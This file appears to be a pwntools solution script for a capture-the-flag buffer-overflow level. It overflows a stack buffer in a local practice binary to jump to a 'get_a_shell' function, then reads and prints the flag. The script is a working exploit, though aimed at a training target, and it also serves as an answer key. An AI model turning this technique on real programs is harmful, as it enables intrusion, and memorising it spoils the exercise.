from pwn import *
import os

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level02') # replace this with the actual level

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={})
else:
    io = elf.process(env={})

get_shell_addr = p32(elf.symbols["get_a_shell"])

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

a = 0x68676665
b = 0x64636261

buf_len = 0x24 - 0xc

payload = buf_len * b"A" + p32(b) + p32(a) + b"A" * 8  + get_shell_addr
io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)

